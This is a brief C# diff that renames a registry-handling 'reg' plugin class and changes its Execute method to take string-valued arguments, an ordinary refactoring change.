@@ -5,7 +5,7 @@ using System.Text;
 
 namespace Plugins
 {
-    public class Plugin : AthenaPlugin
+    public class Reg : AthenaPlugin
     {
         public override string Name => "reg";
         public string NormalizeKey(string text)
@@ -29,7 +29,7 @@ namespace Plugins
 
             return text;
         }
-        public override void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, string> args)
         {
             string action = (string)args["action"];
             string keyPath = NormalizeKey((string)args["keypath"]);
